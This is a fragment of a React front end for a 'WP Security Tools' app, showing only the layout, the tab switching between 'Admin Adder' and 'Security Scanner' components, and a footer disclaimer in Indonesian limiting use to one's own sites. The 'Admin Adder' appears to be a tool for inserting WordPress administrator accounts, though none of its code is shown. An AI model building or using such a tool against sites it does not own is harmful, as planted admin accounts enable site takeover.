  const [activeTab, setActiveTab] = useState("adder");

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900">
      <Toaster position="top-right" richColors />
      
      {/* Header */}
      <header className="border-b border-purple-800/30 bg-black/20 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white" data-testid="app-title">WP Security Tools</h1>
              <p className="text-xs text-purple-300">Admin Adder & Security Scanner</p>
            </div>
          </div>
          
          {/* Tab Navigation */}
          <div className="flex gap-2">
            <button
              onClick={() => setActiveTab("adder")}
              className={`flex items-center gap-2 px-4 py-2 rounded-lg transition-all ${
                activeTab === "adder" ? "bg-purple-600 text-white" : "bg-white/10 text-purple-300 hover:bg-white/20"
              }`}
              data-testid="tab-adder"
            >
              <Code className="w-4 h-4" />
              Admin Adder
            </button>
            <button
              onClick={() => setActiveTab("scanner")}
              className={`flex items-center gap-2 px-4 py-2 rounded-lg transition-all ${
                activeTab === "scanner" ? "bg-green-600 text-white" : "bg-white/10 text-purple-300 hover:bg-white/20"
              }`}
              data-testid="tab-scanner"
            >
              <Scan className="w-4 h-4" />
              Security Scanner
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-8">
        {activeTab === "adder" ? <AdminAdder /> : <SecurityScanner />}
      </main>

      {/* Footer */}
      <footer className="border-t border-purple-800/30 bg-black/20 mt-12">
        <div className="max-w-7xl mx-auto px-4 py-6 text-center">
          <p className="text-sm text-gray-500">
            ⚠️ Tool ini hanya untuk keperluan security audit pada website milik Anda sendiri. Gunakan secara bertanggung jawab.
          </p>
        </div>
      </footer>
    </div>
  );
}

export default App;
